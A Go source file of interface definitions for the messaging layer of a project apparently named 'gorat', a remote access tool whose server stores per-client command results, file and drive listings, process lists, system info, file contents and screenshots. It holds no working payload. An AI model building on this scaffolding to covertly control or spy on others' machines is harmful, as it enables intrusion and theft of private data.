package messaging

import (
"gorat/common"
)

// Handler handles a specific message type
type Handler interface {
	// Handle processes a message and returns an optional response
	Handle(clientID string, msg *common.Message) (interface{}, error)
	// MessageType returns the type of message this handler processes
	MessageType() common.MessageType
}

// Dispatcher dispatches messages to appropriate handlers
type Dispatcher interface {
	// Register registers a handler for a message type
	Register(handler Handler) error
	// Dispatch dispatches a message to the appropriate handler
	Dispatch(clientID string, msg *common.Message) (interface{}, error)
	// HasHandler checks if a handler exists for the message type
	HasHandler(msgType common.MessageType) bool
}

// ResultStore stores command results, file listings, etc.
type ResultStore interface {
	// SetCommandResult stores a command result
	SetCommandResult(clientID string, result *common.CommandResultPayload)
	// GetCommandResult retrieves a command result
	GetCommandResult(clientID string) *common.CommandResultPayload
	// SetFileListResult stores a file list result
	SetFileListResult(clientID string, result *common.FileListPayload)
	// GetFileListResult retrieves a file list result
	GetFileListResult(clientID string) *common.FileListPayload
	// SetDriveListResult stores a drive list result
	SetDriveListResult(clientID string, result *common.DriveListPayload)
	// GetDriveListResult retrieves a drive list result
	GetDriveListResult(clientID string) *common.DriveListPayload
	// SetProcessListResult stores a process list result
	SetProcessListResult(clientID string, result *common.ProcessListPayload)
	// GetProcessListResult retrieves a process list result
	GetProcessListResult(clientID string) *common.ProcessListPayload
	// SetSystemInfoResult stores a system info result
	SetSystemInfoResult(clientID string, result *common.SystemInfoPayload)
	// GetSystemInfoResult retrieves a system info result
	GetSystemInfoResult(clientID string) *common.SystemInfoPayload
	// SetFileDataResult stores a file data result
	SetFileDataResult(clientID string, result *common.FileDataPayload)
	// GetFileDataResult retrieves a file data result
	GetFileDataResult(clientID string) *common.FileDataPayload
	// SetScreenshotResult stores a screenshot result
	SetScreenshotResult(clientID string, result *common.ScreenshotDataPayload)
	// GetScreenshotResult retrieves a screenshot result
	GetScreenshotResult(clientID string) *common.ScreenshotDataPayload
}

// ClientMetadataUpdater updates client metadata
type ClientMetadataUpdater interface {
	// UpdateClientMetadata updates client metadata with the given function
	UpdateClientMetadata(clientID string, fn func(*common.ClientMetadata))
}
